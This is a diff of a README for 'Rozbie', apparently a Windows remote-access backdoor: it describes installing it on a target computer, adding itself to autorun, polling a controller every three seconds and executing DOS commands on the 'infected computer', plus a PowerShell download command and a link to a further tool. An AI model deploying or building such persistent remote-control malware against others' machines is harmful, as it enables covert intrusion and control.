@@ -19,7 +19,7 @@ The presented solution consists of two project:
 It is up to you how you install Rozbie on the target computer.
 On successful run the Rozbie will add itself to the Windows current user autorun. It should run after the user logged into system.
 When it is there it will try to connect to The Rozbie Farm application once per 3 seconds.
-You should be able to type DOS commands in the Rozbie Farm appliaction to be executed on the infected computer.
+You should be able to type DOS commands in the Rozbie Farm application to be executed on the infected computer.
 
 You must change the *IP* address and eventually the port to yours in the main.rs:
 
@@ -55,6 +55,10 @@ You can do it by executing PowerShell command, e.g.:
 ```powershell
 powershell -c "Invoke-WebRequest -Uri 'https://www.website.com/file.zip' -OutFile 'c:\temp\file.zip'"
 ```
+
+## Note
+
+For a more sophisticated solution try [Flea](https://github.com/rozensoftware/flea)
 
 ## Disclaimer
 
